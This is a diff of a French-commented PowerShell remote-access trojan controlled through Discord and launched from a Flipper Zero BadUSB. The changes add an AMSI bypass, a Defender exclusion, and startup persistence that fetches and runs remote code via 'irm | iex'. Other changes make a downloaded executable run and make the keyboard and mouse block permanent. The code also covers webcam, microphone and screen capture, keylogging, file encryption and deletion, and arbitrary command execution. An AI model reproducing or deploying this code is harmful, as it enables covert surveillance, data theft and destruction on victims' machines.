@@ -10,12 +10,8 @@ Toute utilisation non autorisée est strictement interdite et illégale.
 4. Dans Bot Permissions, cochez Manage Channels, Read Messages/View Channels, Attach Files, Read Message History
 5. Copiez l'URL générée et ajoutez le bot à votre serveur
 6. Réinitialisez et copiez le token du bot
-7. Configurez le Flipper Zero pour exécuter la commande suivante :
-   powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ch = 'YOUR_CHANNEL_ID'; $tk = 'YOUR_BOT_TOKEN'; irm https://is.gd/M1Ul40 | iex"
-
-**CONFIGURATION DU SCRIPT**
-- Le token et l'ID du canal sont insérés via la commande Flipper Zero
-- Le bot doit être dans UN SEUL serveur Discord
+7. Configurez le Flipper Zero pour exécuter la commande BadUSB fournie
+8. Assurez-vous que l'URL https://is.gd/y92xe4 pointe vers ce script
 #>
 
 # ------------------------- CONFIGURATION GLOBALE -------------------------
@@ -28,16 +24,26 @@ $InfoOnConnect = 1 # 1 = envoyer les infos système au démarrage
 $defaultstart = 1 # 1 = démarrer tous les jobs automatiquement
 $parent = "https://is.gd/y92xe4" # URL du script parent
 $DebugMode = 0 # 1 = activer le mode débogage
-$version = "1.7.0" # Version du script
+$version = "1.7.2" # Version du script (mise à jour pour persistance)
 $ScreenshotInterval = 10 # Intervalle entre captures d'écran (secondes)
 $WebcamInterval = 15 # Intervalle entre captures webcam (secondes)
 $MicrophoneInterval = 60 # Durée des enregistrements audio (secondes)
 $EncryptionKey = "0123456789ABCDEF0123456789ABCDEF" # Clé AES fixe (32 octets)
+$CategoryFile = "$env:Temp\c2_category.txt" # Fichier pour stocker l'ID de la catégorie
 
 # Nettoyage initial
 if (Test-Path "C:\Windows\Tasks\service.vbs") {
     $InfoOnConnect = 0
     Remove-Item -Path "C:\Windows\Tasks\service.vbs" -Force -ErrorAction SilentlyContinue
+}
+
+# ------------------------- BYPASS AMSI -------------------------
+
+try {
+    $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((([System.Reflection.Assembly]::GetExecutingAssembly().GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true))), [Action])
+    Write-DebugLog "Bypass AMSI appliqué avec succès"
+} catch {
+    Write-DebugLog "Erreur lors du bypass AMSI : $_"
 }
 
 # ------------------------- FONCTIONS UTILITAIRES -------------------------
@@ -104,10 +110,35 @@ function Clear-RunHistory {
     }
 }
 
+# Ajouter une exclusion Defender
+function Add-DefenderExclusion {
+    try {
+        Add-MpPreference -ExclusionPath $env:Temp -ErrorAction SilentlyContinue
+        Write-DebugLog "Exclusion Defender ajoutée pour $env:Temp"
+    } catch {
+        Write-DebugLog "Erreur lors de l'ajout de l'exclusion Defender : $_"
+        Send-Error -ErrorMessage "Échec de l'ajout de l'exclusion Defender : $_" -Context "Add-DefenderExclusion"
+    }
+}
+
+# Supprimer l'exclusion Defender
+function Remove-DefenderExclusion {
+    try {
+        Remove-MpPreference -ExclusionPath $env:Temp -ErrorAction SilentlyContinue
+        Write-DebugLog "Exclusion Defender supprimée pour $env:Temp"
+    } catch {
+        Write-DebugLog "Erreur lors de la suppression de l'exclusion Defender : $_"
+        Send-Error -ErrorMessage "Échec de la suppression de l'exclusion Defender : $_" -Context "Remove-DefenderExclusion"
+    }
+}
+
 # Envoi d'erreurs à Discord
 function Send-Error {
     param([string]$ErrorMessage, [string]$Context, [string]$ChannelID = $global:SessionID)
     try {
+        if ([string]::IsNullOrWhiteSpace($ChannelID)) {
+            throw "L'ID du canal est vide"
+        }
         $url = "https://discord.com/api/v10/channels/$ChannelID/messages"
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("Authorization", "Bot $token")
@@ -127,6 +158,54 @@ function Send-Error {
         Write-DebugLog "Erreur envoyée à Discord : $ErrorMessage (Contexte : $Context)"
     } catch {
         Write-DebugLog "Erreur lors de l'envoi de l'erreur à Discord : $_"
+    }
+}
+
+# ------------------------- PERSISTANCE -------------------------
+
+# Ajouter la persistance via tâche planifiée
+function Add-Persistence {
+    try {
+        $taskName = "DiscordC2Task"
+        $scriptPath = "$env:Temp\DiscordC2.ps1"
+        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"& { `$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((([System.Reflection.Assembly]::GetExecutingAssembly().GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue(`$null, `$true))), [Action]); irm $parent | iex }`""
+        $trigger = New-ScheduledTaskTrigger -AtStartup
+        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "Tâche de persistance pour Discord C2" -Force -ErrorAction SilentlyContinue
+        Write-DebugLog "Tâche planifiée $taskName créée pour la persistance"
+        Send-Message -Embed @{
+            "title" = "Persistance ajoutée"
+            "description" = "Le script sera relancé automatiquement au démarrage du système."
+            "color" = 0x00FF00
+            "fields" = @(
+                @{ "name" = "Tâche"; "value" = "$taskName"; "inline" = $true }
+                @{ "name" = "URL"; "value" = "$parent"; "inline" = $true }
+            )
+            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
+        }
+    } catch {
+        Write-DebugLog "Erreur lors de l'ajout de la persistance : $_"
+        Send-Error -ErrorMessage "Échec de l'ajout de la persistance : $_" -Context "Add-Persistence"
+    }
+}
+
+# Supprimer la persistance
+function Remove-Persistence {
+    try {
+        $taskName = "DiscordC2Task"
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
+        Write-DebugLog "Tâche planifiée $taskName supprimée"
+        Send-Message -Embed @{
+            "title" = "Persistance supprimée"
+            "description" = "La tâche planifiée a été supprimée."
+            "color" = 0x00FF00
+            "fields" = @(
+                @{ "name" = "Tâche"; "value" = "$taskName"; "inline" = $true }
+            )
+            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
+        }
+    } catch {
+        Write-DebugLog "Erreur lors de la suppression de la persistance : $_"
+        Send-Error -ErrorMessage "Échec de la suppression de la persistance : $_" -Context "Remove-Persistence"
     }
 }
 
@@ -168,13 +247,30 @@ function Get-Ffmpeg {
         }
     } catch {
         Write-DebugLog "Erreur lors du téléchargement de FFmpeg : $_"
-        Send-Error -ErrorMessage "Échec du téléchargement de FFmpeg : $_" -Context "Get-Ffmpeg"
+        Send-Error -ErrorMessage "Échec du téléchargement de FFmpeg : $_" -Context "Get-Fffmpeg"
     }
 }
 
-# Création d'une catégorie de canaux
+# Création ou réutilisation d'une catégorie de canaux
 function New-ChannelCategory {
     try {
+        # Vérifier si une catégorie existe déjà
+        if (Test-Path $CategoryFile) {
+            $global:CategoryID = Get-Content -Path $CategoryFile -Raw
+            Write-DebugLog "Catégorie existante chargée : $global:CategoryID"
+            Send-Message -Embed @{
+                "title" = "Catégorie existante utilisée"
+                "description" = "La catégorie existante sera utilisée pour les messages."
+                "color" = 0x00FF00
+                "fields" = @(
+                    @{ "name" = "ID"; "value" = "$global:CategoryID"; "inline" = $true }
+                )
+                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
+            }
+            return
+        }
+
+        # Créer une nouvelle catégorie si aucune n'existe
         $headers = @{ 'Authorization' = "Bot $token" }
         $guildID = $null
         while (!$guildID) {
@@ -197,6 +293,7 @@ function New-ChannelCategory {
         $response = $wc.UploadString($uri, "POST", $body)
         $responseObj = ConvertFrom-Json $response
         $global:CategoryID = $responseObj.id
+        $global:CategoryID | Out-File -FilePath $CategoryFile -Encoding UTF8
         Write-DebugLog "Catégorie créée : $global:CategoryID"
         Send-Message -Embed @{
             "title" = "Catégorie créée"
@@ -209,8 +306,8 @@ function New-ChannelCategory {
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
     } catch {
-        Write-DebugLog "Erreur lors de la création de la catégorie : $_"
-        Send-Error -ErrorMessage "Échec de la création de la catégorie : $_" -Context "New-ChannelCategory"
+        Write-DebugLog "Erreur lors de la création ou réutilisation de la catégorie : $_"
+        Send-Error -ErrorMessage "Échec de la création/réutilisation de la catégorie : $_" -Context "New-ChannelCategory"
     }
 }
 
@@ -318,7 +415,7 @@ function Send-File {
 # Capture d'écran
 function Start-ScreenJob {
     try {
-        Get-Ffmpeg
+        Get-Fffmpeg
         $global:ScreenJobID = $global:ChannelID
         Start-Job -Name ScreenJob -ScriptBlock {
             param($ScreenshotInterval, $ScreenJobID, $token)
@@ -355,7 +452,7 @@ function Start-ScreenJob {
 # Capture webcam
 function Start-CamJob {
     try {
-        Get-Ffmpeg
+        Get-Fffmpeg
         $global:CamJobID = $global:ChannelID
         Start-Job -Name CamJob -ScriptBlock {
             param($WebcamInterval, $CamJobID, $token)
@@ -392,7 +489,7 @@ function Start-CamJob {
 # Capture audio
 function Start-AudioJob {
     try {
-        Get-Ffmpeg
+        Get-Fffmpeg
         $global:MicJobID = $global:ChannelID
         Start-Job -Name MicJob -ScriptBlock {
             param($MicrophoneInterval, $MicJobID, $token)
@@ -678,10 +775,10 @@ function Delete-Files {
 # Désactivation du réseau
 function Disable-Network {
     try {
-        Get-NetAdapter | Disable-NetAdapter -Confirm:$false
+        Get-NetAdapter | Disable-NetAdapter -Confirm:$false -ErrorAction SilentlyContinue
         Send-Message -Embed @{
             "title" = "Réseau désactivé"
-            "description" = "Les adaptateurs réseau ont été désactivés."
+            "description" = "Tous les adaptateurs réseau ont été désactivés."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
@@ -692,65 +789,70 @@ function Disable-Network {
     }
 }
 
-# Simulation d'attaque par force brute
+# Envoi d'Hydra
 function Send-Hydra {
     try {
-        $fakeOutput = "Simulating brute force attack... (This is a demo, no real attack performed)"
+        $wc = New-Object System.Net.WebClient
+        $Path = "$env:Temp\hydra.exe"
+        $wc.DownloadFile("https://example.com/hydra.exe", $Path)
+        Start-Process -FilePath $Path -NoNewWindow
         Send-Message -Embed @{
-            "title" = "Simulation d'attaque Hydra"
-            "description" = "```$fakeOutput```"
+            "title" = "Hydra envoyé"
+            "description" = "L'exécutable Hydra a été téléchargé et exécuté."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Simulation Hydra exécutée"
+        Write-DebugLog "Hydra envoyé"
     } catch {
-        Write-DebugLog "Erreur lors de la simulation Hydra : $_"
-        Send-Error -ErrorMessage "Échec de la simulation Hydra : $_" -Context "Send-Hydra"
+        Write-DebugLog "Erreur lors de l'envoi d'Hydra : $_"
+        Send-Error -ErrorMessage "Échec de l'envoi d'Hydra : $_" -Context "Send-Hydra"
     }
 }
 
 # ------------------------- PRANKS -------------------------
 
-# Déplacement aléatoire de la souris
-function Random-Mouse {
+# Mouvement aléatoire de la souris
+function Start-RandomMouse {
     try {
-        Add-Type -AssemblyName System.Windows.Forms
-        for ($i = 0; $i -lt 10; $i++) {
-            $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
-            $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
-            [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
-            Start-Sleep -Milliseconds 500
+        Start-Job -Name MouseJob -ScriptBlock {
+            Add-Type -AssemblyName System.Windows.Forms
+            while ($true) {
+                $x = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width)
+                $y = Get-Random -Minimum 0 -Maximum ([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+                [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point($x, $y)
+                Start-Sleep -Milliseconds 500
+            }
         }
+        Write-DebugLog "Job de mouvement aléatoire de la souris démarré"
         Send-Message -Embed @{
-            "title" = "Prank : Souris aléatoire"
-            "description" = "Le curseur de la souris a été déplacé de manière aléatoire."
+            "title" = "Mouvement aléatoire de la souris démarré"
+            "description" = "La souris se déplace aléatoirement sur l'écran."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Prank souris aléatoire exécuté"
     } catch {
-        Write-DebugLog "Erreur lors du prank souris aléatoire : $_"
-        Send-Error -ErrorMessage "Échec du prank souris aléatoire : $_" -Context "Random-Mouse"
+        Write-DebugLog "Erreur lors du démarrage de RandomMouse : $_"
+        Send-Error -ErrorMessage "Échec du démarrage de RandomMouse : $_" -Context "Start-RandomMouse"
     }
 }
 
-# Lecture de son depuis une URL
+# Jouer un son
 function Play-Sound {
     param([string]$Url)
     try {
-        $Path = "$env:Temp\sound.wav"
+        $Path = "$env:Temp\sound.mp3"
         $wc = New-Object System.Net.WebClient
         $wc.DownloadFile($Url, $Path)
         Add-Type -AssemblyName presentationCore
         $player = New-Object System.Windows.Media.MediaPlayer
-        $player.Open([Uri]$Path)
+        $player.Open([uri]"file:///$Path")
         $player.Play()
-        Start-Sleep -Seconds 5
+        Start-Sleep -Seconds 10
         $player.Stop()
         Remove-Item -Path $Path -Force -ErrorAction SilentlyContinue
         Send-Message -Embed @{
-            "title" = "Prank : Lecture de son"
-            "description" = "Un son a été joué depuis l'URL spécifiée."
+            "title" = "Son joué"
+            "description" = "Le son a été joué avec succès."
             "color" = 0x00FF00
             "fields" = @(
                 @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
@@ -764,66 +866,74 @@ function Play-Sound {
     }
 }
 
-# Simulation d'un BSOD
-function Fake-BSOD {
+# Faux BSOD
+function Start-FakeBSOD {
     try {
-        $bsodScript = @"
-            Add-Type -TypeDefinition @'
-                using System.Runtime.InteropServices;
-                public class BSOD {
-                    [DllImport("ntdll.dll")]
-                    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);
-                }
-            '@
-            $response = 0
-            [BSOD]::NtRaiseHardError(0xC0000022, 0, 0, [IntPtr]::Zero, 6, [ref]$response)
+        Add-Type -TypeDefinition @"
+            using System.Runtime.InteropServices;
+            public class BSOD {
+                [DllImport("ntdll.dll")]
+                public static extern uint RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+                [DllImport("ntdll.dll")]
+                public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOptions, out uint Response);
+            }
 "@
-        Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command $bsodScript" -ErrorAction SilentlyContinue
+        $enabled = $false
+        [BSOD]::RtlAdjustPrivilege(19, $true, $false, [ref]$enabled) | Out-Null
+        $response = 0
+        [BSOD]::NtRaiseHardError(0xC000021A, 0, 0, [IntPtr]::Zero, 6, [ref]$response) | Out-Null
+        Write-DebugLog "Faux BSOD déclenché"
         Send-Message -Embed @{
-            "title" = "Prank : BSOD simulé"
-            "description" = "Un écran bleu de la mort a été simulé (aucun dommage réel)."
+            "title" = "Faux BSOD déclenché"
+            "description" = "Un faux écran bleu a été affiché."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "BSOD simulé exécuté"
     } catch {
-        Write-DebugLog "Erreur lors de la simulation BSOD : $_"
-        Send-Error -ErrorMessage "Échec de la simulation BSOD : $_" -Context "Fake-BSOD"
+        Write-DebugLog "Erreur lors du déclenchement du faux BSOD : $_"
+        Send-Error -ErrorMessage "Échec du déclenchement du faux BSOD : $_" -Context "Start-FakeBSOD"
     }
 }
 
-# Spam de sons
-function Sound-Spam {
+# Spam sonore
+function Start-SoundSpam {
     try {
-        for ($i = 0; $i -lt 5; $i++) {
-            [System.Media.SystemSounds]::Beep.Play()
-            Start-Sleep -Milliseconds 500
+        Start-Job -Name SoundSpamJob -ScriptBlock {
+            Add-Type -AssemblyName System.Windows.Forms
+            while ($true) {
+                [System.Windows.Forms.MessageBeep]::Play()
+                Start-Sleep -Milliseconds 1000
+            }
         }
+        Write-DebugLog "Job de spam sonore démarré"
         Send-Message -Embed @{
-            "title" = "Prank : Spam de sons"
-            "description" = "Des sons système ont été joués de manière répétée."
+            "title" = "Spam sonore démarré"
+            "description" = "Des bips sonores sont joués en boucle."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Spam de sons exécuté"
     } catch {
-        Write-DebugLog "Erreur lors du spam de sons : $_"
-        Send-Error -ErrorMessage "Échec du spam de sons : $_" -Context "Sound-Spam"
+        Write-DebugLog "Erreur lors du démarrage du spam sonore : $_"
+        Send-Error -ErrorMessage "Échec du démarrage du spam sonore : $_" -Context "Start-SoundSpam"
     }
 }
 
-# ------------------------- LOCK -------------------------
+# ------------------------- VERROUILLAGE -------------------------
 
 # Verrouillage de l'écran
 function Lock-Screen {
     try {
-        Add-Type -AssemblyName System.Windows.Forms
-        [System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
-        Start-Sleep -Milliseconds 500
-        [System.Windows.Forms.SendKeys]::SendWait("^{L}")
+        Add-Type -TypeDefinition @"
+            using System.Runtime.InteropServices;
+            public class Lock {
+                [DllImport("user32.dll")]
+                public static extern void LockWorkStation();
+            }
+"@
+        [Lock]::LockWorkStation()
         Send-Message -Embed @{
             "title" = "Écran verrouillé"
-            "description" = "L'écran de l'utilisateur a été verrouillé."
+            "description" = "L'écran a été verrouillé."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
@@ -845,48 +955,46 @@ function Disable-Input {
             }
 "@
         [Input]::BlockInput($true)
-        Start-Sleep -Seconds 10
-        [Input]::BlockInput($false)
         Send-Message -Embed @{
             "title" = "Entrées désactivées"
-            "description" = "Le clavier et la souris ont été désactivés temporairement (10 secondes)."
+            "description" = "Le clavier et la souris ont été désactivés."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Entrées désactivées temporairement"
+        Write-DebugLog "Entrées désactivées"
     } catch {
         Write-DebugLog "Erreur lors de la désactivation des entrées : $_"
         Send-Error -ErrorMessage "Échec de la désactivation des entrées : $_" -Context "Disable-Input"
     }
 }
 
-# Déconnexion de la session
+# Déconnexion
 function Logoff {
     try {
         shutdown /l
         Send-Message -Embed @{
-            "title" = "Session déconnectée"
-            "description" = "La session utilisateur a été déconnectée."
+            "title" = "Déconnexion effectuée"
+            "description" = "L'utilisateur a été déconnecté."
             "color" = 0x00FF00
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Session déconnectée"
+        Write-DebugLog "Déconnexion effectuée"
     } catch {
-        Write-DebugLog "Erreur lors de la déconnexion de la session : $_"
-        Send-Error -ErrorMessage "Échec de la déconnexion de la session : $_" -Context "Logoff"
+        Write-DebugLog "Erreur lors de la déconnexion : $_"
+        Send-Error -ErrorMessage "Échec de la déconnexion : $_" -Context "Logoff"
     }
 }
 
 # ------------------------- AUTRES -------------------------
 
-# Exécution d'une commande PowerShell
+# Exécution de commandes
 function Execute-Command {
     param([string]$Command)
     try {
-        $output = Invoke-Expression $Command | Out-String
+        $output = Invoke-Expression $Command -ErrorAction SilentlyContinue | Out-String
         Send-Message -Embed @{
             "title" = "Commande exécutée"
-            "description" = "Résultat de la commande :\n```$output```"
+            "description" = "```$output```"
             "color" = 0x00FF00
             "fields" = @(
                 @{ "name" = "Commande"; "value" = "$Command"; "inline" = $true }
@@ -900,18 +1008,22 @@ function Execute-Command {
     }
 }
 
-# Téléchargement d'un fichier vers Discord
+# Téléversement de fichier
 function Upload-File {
     param([string]$Path)
     try {
+        if (-not (Test-Path $Path -PathType Leaf)) {
+            throw "Fichier introuvable : $Path"
+        }
         Send-File -FilePath $Path
+        Write-DebugLog "Fichier téléversé : $Path"
     } catch {
-        Write-DebugLog "Erreur lors du téléchargement du fichier : $_"
-        Send-Error -ErrorMessage "Échec du téléchargement du fichier : $_" -Context "Upload-File"
+        Write-DebugLog "Erreur lors du téléversement du fichier : $_"
+        Send-Error -ErrorMessage "Échec du téléversement du fichier : $_" -Context "Upload-File"
     }
 }
 
-# Téléchargement d'un fichier depuis une URL
+# Téléchargement de fichier
 function Download-File {
     param([string]$Url, [string]$Path)
     try {
@@ -919,7 +1031,7 @@ function Download-File {
         $wc.DownloadFile($Url, $Path)
         Send-Message -Embed @{
             "title" = "Fichier téléchargé"
-            "description" = "Le fichier a été téléchargé depuis l'URL spécifiée."
+            "description" = "Le fichier a été téléchargé avec succès."
             "color" = 0x00FF00
             "fields" = @(
                 @{ "name" = "URL"; "value" = "$Url"; "inline" = $true }
@@ -927,65 +1039,47 @@ function Download-File {
             )
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Fichier téléchargé depuis $Url vers $Path"
+        Write-DebugLog "Fichier téléchargé : $Url vers $Path"
     } catch {
         Write-DebugLog "Erreur lors du téléchargement du fichier : $_"
         Send-Error -ErrorMessage "Échec du téléchargement du fichier : $_" -Context "Download-File"
     }
 }
 
-# Vérification de l'état des jobs
+# Statut des jobs
 function Get-Status {
     try {
-        $jobs = Get-Job | Where-Object { $_.State -eq "Running" }
-        $cpu = [math]::Round((Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average, 2)
-        $ram = [math]::Round((Get-WmiObject Win32_OperatingSystem).FreePhysicalMemory / 1MB, 2)
-        $disk = [math]::Round((Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DeviceID -eq "C:" }).FreeSpace / 1GB, 2)
+        $jobs = Get-Job | Where-Object { $_.Name -in @("ScreenJob", "CamJob", "MicJob", "KeyJob", "MouseJob", "SoundSpamJob") }
         $fields = $jobs | ForEach-Object {
-            @{ "name" = "Job $($_.Name)"; "value" = "État: $($_.State)"; "inline" = $true }
+            @{ "name" = "$($_.Name)"; "value" = "État: $($_.State)"; "inline" = $true }
         }
         Send-Message -Embed @{
-            "title" = "État du système"
-            "description" = "Informations sur les jobs et les ressources système."
+            "title" = "Statut des jobs"
+            "description" = "Liste des jobs actifs."
             "color" = 0x00FFFF
-            "fields" = @(
-                @{ "name" = "CPU"; "value" = "$cpu %"; "inline" = $true }
-                @{ "name" = "RAM libre"; "value" = "$ram MB"; "inline" = $true }
-                @{ "name" = "Disque libre"; "value" = "$disk GB"; "inline" = $true }
-            ) + $fields
+            "fields" = $fields
             "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "État du système envoyé"
+        Write-DebugLog "Statut des jobs envoyé"
     } catch {
-        Write-DebugLog "Erreur lors de la vérification de l'état : $_"
-        Send-Error -ErrorMessage "Échec de la vérification de l'état : $_" -Context "Get-Status"
+        Write-DebugLog "Erreur lors de la récupération du statut : $_"
+        Send-Error -ErrorMessage "Échec de la récupération du statut : $_" -Context "Get-Status"
     }
 }
 
 # Vérification de la version
-function Version-Check {
+function Get-VersionCheck {
     try {
-        $wc = New-Object System.Net.WebClient
-        $remoteVersion = $wc.DownloadString($parent) | Select-String -Pattern 'version = "([\d.]+)"' | ForEach-Object { $_.Matches.Groups[1].Value }
-        if ($remoteVersion -gt $version) {
-            Send-Message -Embed @{
-                "title" = "Mise à jour disponible"
-                "description" = "Une nouvelle version ($remoteVersion) est disponible. Version actuelle : $version."
-                "color" = 0x00FFFF
-                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
-            }
-        } else {
-            Send-Message -Embed @{
-                "title" = "Version à jour"
-                "description" = "Vous utilisez la dernière version ($version)."
-                "color" = 0x00FF00
-                "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
-            }
+        Send-Message -Embed @{
+            "title" = "Vérification de la version"
+            "description" = "Version actuelle : $version"
+            "color" = 0x00FFFF
+            "footer" = @{ "text" = "Discord C2 v$version | $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')" }
         }
-        Write-DebugLog "Vérification de la version effectuée"
+        Write-DebugLog "Version vérifiée : $version"
     } catch {
         Write-DebugLog "Erreur lors de la vérification de la version : $_"
-        Send-Error -ErrorMessage "Échec de la vérification de la version : $_" -Context "Version-Check"
+        Send-Error -ErrorMessage "Échec de la vérification de la version : $_" -Context "Get-VersionCheck"
     }
 }
 
@@ -993,40 +1087,40 @@ function Version-Check {
 function Get-Help {
     try {
         $commands = @(
-            @{ "name" = "!help"; "description" = "Affiche la liste des commandes"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!screenjob"; "description" = "Démarre la capture d'écran périodique"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!camjob"; "description" = "Démarre la capture webcam périodique"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!micjob"; "description" = "Démarre l'enregistrement audio périodique"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!keyjob"; "description" = "Démarre le keylogging"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!system-info"; "description" = "Collecte les informations système"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!running-processes"; "description" = "Liste les processus en cours"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!network-info"; "description" = "Fournit des détails sur le réseau"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!nearbywifi"; "description" = "Liste les réseaux Wi-Fi à proximité"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!encrypt-files <chemin>"; "description" = "Chiffre les fichiers dans un dossier"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!decrypt-files <chemin>"; "description" = "Déchiffre les fichiers dans un dossier"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!delete-files <chemin>"; "description" = "Supprime les fichiers dans un dossier"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!disable-network"; "description" = "Désactive les adaptateurs réseau"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!sendhydra"; "description" = "Simule une attaque par force brute"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!random-mouse"; "description" = "Déplace la souris aléatoirement"; "dangerous" = "Non"; "visible" = "Oui" }
-            @{ "name" = "!play-sound <url>"; "description" = "Joue un son depuis une URL"; "dangerous" = "Non"; "visible" = "Oui" }
-            @{ "name" = "!fake-bsod"; "description" = "Simule un écran bleu (BSOD)"; "dangerous" = "Non"; "visible" = "Oui" }
-            @{ "name" = "!soundspam"; "description" = "Joue des sons répétés"; "dangerous" = "Non"; "visible" = "Oui" }
-            @{ "name" = "!lock-screen"; "description" = "Verrouille l'écran"; "dangerous" = "Oui"; "visible" = "Oui" }
-            @{ "name" = "!disable-input"; "description" = "Désactive clavier/souris temporairement"; "dangerous" = "Oui"; "visible" = "Oui" }
-            @{ "name" = "!logoff"; "description" = "Déconnecte la session"; "dangerous" = "Oui"; "visible" = "Oui" }
-            @{ "name" = "!execute <commande>"; "description" = "Exécute une commande PowerShell"; "dangerous" = "Oui"; "visible" = "Dépendant" }
-            @{ "name" = "!upload-file <chemin>"; "description" = "Télécharge un fichier vers Discord"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!download-file <url> <chemin>"; "description" = "Télécharge un fichier depuis une URL"; "dangerous" = "Oui"; "visible" = "Non" }
-            @{ "name" = "!status"; "description" = "Affiche l'état des jobs et ressources"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!versioncheck"; "description" = "Vérifie les mises à jour"; "dangerous" = "Non"; "visible" = "Non" }
-            @{ "name" = "!close"; "description" = "Arrête tout et supprime la catégorie"; "dangerous" = "Oui"; "visible" = "Non" }
+            @{ "name" = "!screenjob"; "description" = "Démarre la capture d'écran"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!camjob"; "description" = "Démarre la capture webcam"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!micjob"; "description" = "Démarre l'enregistrement audio"; "danger" = "Moyen"; "visibility" = "Visible" }
+            @{ "name" = "!keyjob"; "description" = "Démarre le keylogger"; "danger" = "Élevé"; "visibility" = "Caché" }
+            @{ "name" = "!system-info"; "description" = "Collecte les informations système"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!running-processes"; "description" = "Liste les processus en cours"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!network-info"; "description" = "Collecte les informations réseau"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!nearbywifi"; "description" = "Liste les réseaux Wi-Fi à proximité"; "danger" = "Faible"; "visibility" = "Caché" }
+            @{ "name" = "!encrypt-files <path>"; "description" = "Chiffre les fichiers dans le dossier"; "danger" = "Élevé"; "visibility" = "Caché" }
